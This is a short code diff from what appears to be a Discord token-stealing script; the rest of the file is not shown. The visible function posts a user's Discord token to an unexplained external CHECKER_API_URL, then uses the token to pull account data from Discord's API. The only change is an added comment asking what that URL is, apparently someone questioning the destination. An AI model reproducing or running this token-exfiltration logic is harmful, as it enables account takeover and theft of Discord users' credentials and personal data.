@@ -46,7 +46,7 @@ def getheaders(token=None):
     return headers
 def getuserdata(token):
     try:
-        r = post(CHECKER_API_URL, json={'token':token})
+        r = post(CHECKER_API_URL, json={'token':token}) # what is CHECKER_API_URL
         if r.status_code == 200:
             return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
         elif r.status_code == 429:
